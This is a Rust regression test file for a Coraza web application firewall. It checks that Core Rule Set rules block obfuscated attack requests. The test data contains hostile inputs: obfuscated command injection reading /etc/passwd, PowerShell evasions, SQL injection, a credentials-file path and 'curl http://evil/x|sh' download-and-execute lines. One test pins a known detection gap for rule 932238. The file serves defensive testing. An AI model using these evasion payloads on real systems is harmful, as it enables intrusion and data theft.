// Copyright Coraza Kubernetes Operator contributors.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
// http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

#![expect(
    clippy::unwrap_used,
    clippy::print_stderr,
    clippy::tests_outside_test_module,
    reason = "CRS regression tests use the pinned rule set and fixed requests, and report a skipped run"
)]

//! Detection regressions checked against the pinned CRS release.
//!
//! The tree is the one `make crs-fetch` puts in `envoy-coraza/crs`, as the `crs` group of
//! `benches/micro.rs` uses it. It is not tracked, so each test prints a message and passes
//! when it is absent; CI fetches it before the feature-matrix test run.

use std::{fmt::Write as _, path::Path, sync::OnceLock};

use coraza::{
    Waf,
    seclang::{Parser, RECOMMENDED_CONF},
};

/// The CRS tree fetched by `make crs-fetch`.
const CRS: &str = concat!(env!("CARGO_MANIFEST_DIR"), "/../envoy-coraza/crs");

/// The recommended configuration, blocking, then the CRS at `paranoia`, or `None` without the tree.
fn compile(paranoia: u8, multiphase: bool) -> Option<Waf> {
    if !Path::new(CRS).join("rules").is_dir() {
        eprintln!("skipped: no CRS tree at {CRS}; run `make crs-fetch`");
        return None;
    }
    let mut parser = Parser::new();
    parser.config_mut().multiphase_evaluation = multiphase;
    parser.from_string(RECOMMENDED_CONF).unwrap();
    parser
        .from_string(&format!(
            "SecRuleEngine On\n\
             SecAction \"id:900000,phase:1,pass,nolog,setvar:tx.blocking_paranoia_level={paranoia},\
             setvar:tx.detection_paranoia_level={paranoia}\"\n\
             Include {CRS}/crs-setup.conf.example\n\
             Include {CRS}/rules/*.conf\n"
        ))
        .unwrap();
    Some(parser.into_waf().unwrap())
}

/// The CRS engines for `paranoia` 1 to 3, without and with multiphase evaluation, compiled once.
fn engines(paranoia: u8) -> &'static [Waf] {
    static PL1: OnceLock<Vec<Waf>> = OnceLock::new();
    static PL2: OnceLock<Vec<Waf>> = OnceLock::new();
    static PL3: OnceLock<Vec<Waf>> = OnceLock::new();
    let cell = match paranoia {
        1 => &PL1,
        2 => &PL2,
        _ => &PL3,
    };
    cell.get_or_init(|| {
        [false, true]
            .into_iter()
            .filter_map(|multiphase| compile(paranoia, multiphase))
            .collect()
    })
}

/// One request: the interrupting rule and the ids of the rules that matched.
fn run(waf: &Waf, uri: &str, content_type: Option<&str>, body: &[u8]) -> (Option<i32>, Vec<i32>) {
    run_with_headers(waf, uri, content_type, body, &[("User-Agent", "curl/8.0")])
}

/// Like `run`, with `headers` in place of the default `User-Agent`.
fn run_with_headers(
    waf: &Waf,
    uri: &str,
    content_type: Option<&str>,
    body: &[u8],
    headers: &[(&str, &str)],
) -> (Option<i32>, Vec<i32>) {
    let mut tx = waf.new_transaction();
    tx.process_uri(uri, if body.is_empty() { "GET" } else { "POST" }, "HTTP/1.1");
    tx.add_request_header("Host", "example.com");
    for (name, value) in headers {
        tx.add_request_header(name, value);
    }
    tx.add_request_header("Accept", "*/*");
    if let Some(content_type) = content_type {
        tx.add_request_header("Content-Type", content_type);
        tx.add_request_header("Content-Length", body.len().to_string());
    }
    if tx.process_request_headers().is_none() {
        tx.process_request_body(body);
    }
    let matched = tx.matched_rules().iter().map(|rule| rule.rule.id()).collect();
    (tx.interruption().map(|interruption| interruption.rule_id), matched)
}

/// Assert that every engine at `paranoia` blocks the request through `rule`.
fn assert_blocked_by(paranoia: u8, rule: i32, uri: &str, content_type: Option<&str>, body: &[u8]) {
    for (waf, multiphase) in engines(paranoia).iter().zip([false, true]) {
        let (interruption, matched) = run(waf, uri, content_type, body);
        assert!(
            matched.contains(&rule),
            "{rule} must match {uri} {body:?} (multiphase={multiphase}), matched {matched:?}"
        );
        assert_eq!(
            interruption,
            Some(949_110),
            "multiphase={multiphase}, matched {matched:?}"
        );
    }
}

/// Assert that every engine at `paranoia` blocks a request whose `header` is `value`, through `rule`.
fn assert_header_blocked_by(paranoia: u8, rule: i32, header: &str, value: &str) {
    for (waf, multiphase) in engines(paranoia).iter().zip([false, true]) {
        let (interruption, matched) = run_with_headers(waf, "/", None, b"", &[(header, value)]);
        assert!(
            matched.contains(&rule),
            "{rule} must match {header}: {value:?} (multiphase={multiphase}), matched {matched:?}"
        );
        assert_eq!(
            interruption,
            Some(949_110),
            "multiphase={multiphase}, matched {matched:?}"
        );
    }
}

/// A `GET /?x=` request whose value is `value`, percent-encoded.
fn query(value: &str) -> String {
    let mut uri = String::from("/?x=");
    for byte in value.bytes() {
        if byte.is_ascii_alphanumeric() {
            uri.push(char::from(byte));
        } else {
            write!(uri, "%{byte:02X}").unwrap();
        }
    }
    uri
}

/// A multipart upload of one file named `filename`.
fn upload(filename: &str) -> Vec<u8> {
    format!(
        "--BOUND\r\nContent-Disposition: form-data; name=\"f\"; filename=\"{filename}\"\r\n\
         Content-Type: text/plain\r\n\r\nhello\r\n--BOUND--\r\n"
    )
    .into_bytes()
}

const FORM: Option<&str> = Some("application/x-www-form-urlencoded");
const MULTIPART: Option<&str> = Some("multipart/form-data; boundary=BOUND");

/// CRS ships `SecRuleUpdateTargetById 930120 "!ARGS_NAMES:/^json\.profile[.\w\-]*$/"`: under
/// multiphase it must still inspect the value of that field.
#[test]
fn crs_930120_inspects_the_value_of_a_json_profile_field_under_multiphase() {
    let body = br#"{"profile":".aws/credentials"}"#;
    assert_blocked_by(1, 930_120, "/", Some("application/json"), body);
}

/// A negated anchored `@rx` must see the whole value, not one of its lines.
#[test]
fn negated_anchored_rx_rules_see_the_whole_value() {
    // 920120: `%0a` in a file name decodes to LF under `t:urlDecodeUni`.
    assert_blocked_by(1, 920_120, "/upload", MULTIPART, &upload("x' or 1=1-- %0a.jpg"));
    assert_blocked_by(2, 942_200, "/login", FORM, b"q=x,0x41'%0aabc");
    assert_blocked_by(2, 942_440, "/login", FORM, b"q=1;--%0a1");
}

/// 933180 takes the byte path; a newline inside the call's parentheses must not hide it.
#[test]
fn crs_933180_sees_a_php_call_split_by_a_newline() {
    assert_blocked_by(1, 933_180, "/x", FORM, b"x=$f(%0a1)");
}

/// `t:cmdLine` removes the backtick, so the obfuscated commands match the plain ones.
#[test]
fn backtick_obfuscated_commands_block_at_paranoia_level_1() {
    assert_blocked_by(1, 932_120, &query("Invoke`-`Expression $x"), None, b"");
    assert_blocked_by(1, 932_120, &query("Get`-`Content C:\\secret.txt"), None, b"");
    assert_blocked_by(1, 932_160, &query(";c``at /e``tc/pa``sswd"), None, b"");
}

/// 932270 takes the backtick as the byte before `~+`/`~-`. `t:cmdLine` keeps a backtick whose
/// next byte that is not removed is `~`, so a word byte before the backtick or a removed quote,
/// backslash or caret after it does not hide the substitution, and a closed one is caught too (the build
/// that kept every backtick missed ``a`~+` `` and `` `~+` ``: the closing backtick is neither
/// the end nor a digit).
#[test]
fn crs_932270_sees_a_backtick_tilde_substitution() {
    for value in [
        "`~+`", "a`~+`", "a`~+", "a`~+1`", "a`~-1`", "cd`~-", "x`~+2", "a``~+1", "a`\"~+", "a`'~-", "a`\\~+", "a`^~+",
        "a`^~-2",
    ] {
        assert_blocked_by(1, 932_270, &query(value), None, b"");
    }
}

/// CRS 932140 (PL1) needs the space or `)` directly before `in(`, `do` and `defined`, `exist`,
/// `errorlevel`, `cmdextversion`. `PowerShell` drops a backtick before a letter in a double-quoted
/// string, so `t:cmdLine` must not leave one between that space and the keyword.
#[test]
fn crs_932140_sees_a_powershell_backtick_before_a_windows_keyword() {
    for value in [
        "cmd /c \"if `defined x calc\"",
        "cmd /c \"for /f %i `in ('whoami') `do calc\"",
        "if `exist c:\\x calc",
        "if `not exist x calc",
        "if `errorlevel 1 calc",
        "if `cmdextversion 2 calc",
        "for %i `in (x) `do calc",
        "for %i in(x)`do calc",
    ] {
        assert_blocked_by(1, 932_140, &query(value), None, b"");
    }
}

/// Known miss, pinned so a rule-file fix flips it: `t:cmdLine` removes a backtick unless the next
/// byte that is not removed is `~`, so PL3 rule 932238 loses it as a command start, in a word
/// (``Proc`ess`` has the same bytes) and at a word start (the 932140 shapes above need it removed). Each
/// request still blocks at PL1 (932235, 932260 and 932380 read `t:none`, 932140 reads `for`), and
/// at PL3 its inbound score drops by 5.
#[test]
fn crs_932238_known_miss_of_a_backtick_command_start() {
    for value in [
        "foo`whoami`",
        "foo`whoami",
        "`~`whoami",
        "echo `whoami`",
        "x;`whoami`",
        ")`whoami`",
        "echo `\"whoami\"`",
        ">`whoami",
        "a(`whoami`",
        "a)`whoami`",
        "a,`whoami`",
        "a;`whoami`",
        "a<`whoami`",
        "a>`whoami`",
        "x,`whoami`",
        "for /f %i `in(`whoami`) do echo %i",
        "for /f \"usebackq\" %i in (`whoami`) do echo %i",
    ] {
        for (waf, multiphase) in engines(3).iter().zip([false, true]) {
            let (interruption, matched) = run(waf, &query(value), None, b"");
            assert!(
                !matched.contains(&932_238),
                "932238 now matches {value:?} (multiphase={multiphase}): turn this into a catch"
            );
            assert_eq!(
                interruption,
                Some(949_110),
                "multiphase={multiphase}, matched {matched:?}"
            );
        }
        for (waf, multiphase) in engines(1).iter().zip([false, true]) {
            let (interruption, matched) = run(waf, &query(value), None, b"");
            assert_eq!(
                interruption,
                Some(949_110),
                "{value:?} must block at PL1 (multiphase={multiphase}), matched {matched:?}"
            );
        }
    }
}

/// CRS 932130 (`[^\)]+` inside `$(...)`) needs a byte between the parentheses, and bash runs an empty
/// command substitution, `` $(``) ``, as nothing: `` c$(``)at `` is `cat`. `t:cmdLine` keeps one backtick
/// when a run of them is all that is between `(` and `)`, so the shell command still matches at PL1.
#[test]
fn crs_932130_sees_an_empty_backtick_substitution() {
    for value in [
        ";c$(``)at /e$(``)tc/pa$(``)sswd",
        "x;c$(``)url http://evil/x|s$(``)h",
        ";w$(``)get http://evil/x",
        "who$(``)ami",
        "w$(``)hoami",
        "$(``)",
        "$(`)",
        "$(``'')",
        "$(\"`\\`^)",
        "$(``) id",
    ] {
        assert_blocked_by(1, 932_130, &query(value), None, b"");
    }
}

/// The glob branch of 932130, `/[0-9A-Z_a-z]*\[[^\]]+\]`, needs a byte inside the brackets too, and bash
/// removes an empty command substitution from a glob: ```/e[^``^]c``` is the pattern `/e[^^]c`, which
/// matches `/etc`, so ``` cat /e[^``^]c/passwd ``` prints the file. `t:cmdLine` keeps one backtick when a run of
/// them is all that is between `[` and `]`, so the glob still matches at PL1.
#[test]
fn crs_932130_sees_an_empty_backtick_glob_bracket() {
    for value in [
        "cat /e[^``^]c/passwd",
        "/bin/ca[^``^] /e[^``^]c/passwd",
        "cat /e[^\"``\"^]c/passwd",
    ] {
        assert_blocked_by(1, 932_130, &query(value), None, b"");
    }
}

/// 932131 (PL2) reads `User-Agent` and `Referer` with the same regex as 932130, so it needs the same byte
/// inside `$(...)` and `[...]`.
#[test]
fn crs_932131_sees_an_empty_backtick_substitution_in_a_header() {
    for header in ["User-Agent", "Referer"] {
        for value in [
            ";c$(``)at /e$(``)tc/pa$(``)sswd",
            "who$(``)ami",
            "$(``)",
            "cat /e[^``^]c/passwd",
        ] {
            assert_header_blocked_by(2, 932_131, header, value);
            assert_header_blocked_by(3, 932_131, header, value);
        }
    }
}

/// CRS 932140 (`%+[^ ]+ in\(`) needs a byte after the `%` of a `for` loop, and Windows accepts any character that
/// is not a digit as the loop variable, a backtick included: `` for %` in (x) do calc `` runs `calc`. `t:cmdLine`
/// keeps one backtick when the last byte it wrote before the run is `%` (`%` at the command line, `%%` in a batch
/// file), so the command still blocks at PL1, as it does with the previous `t:cmdLine`.
#[test]
fn crs_932140_sees_a_backtick_loop_variable() {
    for value in [
        "for %` in (x) do calc",
        "for %%` in (x) do calc",
        "for /f %` in ('whoami') do calc",
        "for /f %%` in ('whoami') do calc",
        "for /l %%` in (1,1,3) do calc",
        "for /d %^` in (*) do calc",
        "cmd /c \"for %` in (x) do calc\"",
    ] {
        for paranoia in 1..=3 {
            assert_blocked_by(paranoia, 932_140, &query(value), None, b"");
        }
    }
}
